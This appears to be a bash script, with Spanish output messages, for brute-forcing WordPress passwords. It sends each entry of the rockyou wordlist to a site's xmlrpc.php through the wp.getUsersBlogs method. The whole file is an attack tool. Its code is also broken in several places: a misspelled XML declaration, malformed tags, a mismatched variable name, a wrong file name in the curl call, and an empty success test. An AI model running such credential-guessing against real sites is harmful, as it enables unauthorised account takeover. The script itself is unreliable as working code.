#!/bin/bash

function ctrl_c(){
	echo -e "\n\n[!] Saliendo...\n"
	exit 1
}

# Ctrl+c
trap ctrl_c SIGINT

function createXML(){
	password=$1

	xmlFile="""
<?xml version=\"1.0\" endcoding=\"UTF-8\"?>
<methodName>wp.getUsersBlogs<methodName>
<params>
<param><value>UserName</value></param>
<param><value>$Password</value></param>
</params>
</methodName>"""

	echo $xmlFile > file.xml

	response=$(curl -s -X POST "HTTP://HOSTWORDPRES//xmlrpc.php" -d@file.xlm)

	if []; then
		echo -e "\n[+] La contraseña para el usuario (completar con nombre de usuario) es $password"
		exit 0
	fi
}

cat /usr/share/wordlists/rockyou.txt | while read password; do
	createXML $password
done
